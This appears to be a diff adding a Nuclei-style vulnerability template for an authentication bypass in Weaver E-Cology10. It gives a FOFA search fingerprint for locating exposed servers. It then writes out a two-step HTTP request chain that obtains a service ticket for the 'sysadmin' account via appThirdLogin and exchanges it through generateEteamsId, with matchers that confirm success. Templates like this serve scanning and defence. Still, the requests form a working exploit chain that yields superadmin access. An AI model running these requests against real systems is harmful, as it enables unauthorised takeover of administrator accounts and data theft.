@@ -1,0 +1,55 @@
+id: WeaverOA-E-Cology-appThirdLogin-Authentication-bypass
+
+info:
+  name: 泛微E-Cology10 appThirdLogin 身份认证绕过漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: icon_hash="-1619753057"
+    泛微E-Cology10 appThirdLogin 接口存在身份认证绕过漏洞，未经身份验证的远程攻击者可以利用此接口获取登录凭据信息，拿到凭据后可绕过身份认证，使用超级管理员账户登录系统后台，造成信息泄露或者恶意破坏，使系统处于极不安全的状态。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487046&idx=1&sn=7874d2ac7f589a1ddc50d82b57b93dc0&chksm=c267bb75f510326338d86498153377597db98813923280dd2c9d452739323fc8db35349a95ed&token=101124693&lang=zh_CN#rd
+  tags: Authentication bypass
+  
+
+http:
+  - raw:
+      - |
+        POST /papi/passport/rest/appThirdLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=sysadmin&service=1&ip=1&loginType=third
+      - |
+        POST /papi/passport/login/generateEteamsId HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        stTicket={{uploadfile}}
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '"serviceTicketId":"([^"]+)"'
+         internal: true
+  
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '接口返回成功'
+          - '"data":'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
